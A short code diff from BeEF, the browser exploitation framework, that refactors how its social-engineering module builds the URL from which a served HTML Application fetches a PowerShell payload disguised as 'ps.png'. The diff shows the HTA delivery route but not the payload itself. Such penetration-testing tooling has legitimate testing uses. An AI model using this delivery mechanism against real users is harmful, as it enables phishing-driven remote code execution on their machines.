@@ -28,11 +28,10 @@ module BeEF
         # serves the HTML Application (HTA)
         get '/hta' do
           response['Content-Type'] = "application/hta"
-          host = BeEF::Core::Configuration.instance.get('beef.http.public') || BeEF::Core::Configuration.instance.get('beef.http.host')
-          port = BeEF::Core::Configuration.instance.get('beef.http.public_port') || BeEF::Core::Configuration.instance.get('beef.http.port')
-          proto = BeEF::Core::Configuration.instance.get("beef.http.https.enable") == true ? "https" : "http"
-          ps_url = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.powershell_handler_url')
-          payload_url = "#{proto}://#{host}:#{port}#{ps_url}/ps.png"
+          @config = BeEF::Core::Configuration.instance
+          beef_url_str = @config.beef_url_str
+          ps_url = @config.get('beef.extension.social_engineering.powershell.powershell_handler_url')
+          payload_url = "#{beef_url_str}#{ps_url}/ps.png"
 
           print_info "Serving HTA. Powershell payload will be retrieved from: #{payload_url}"
           "<script>
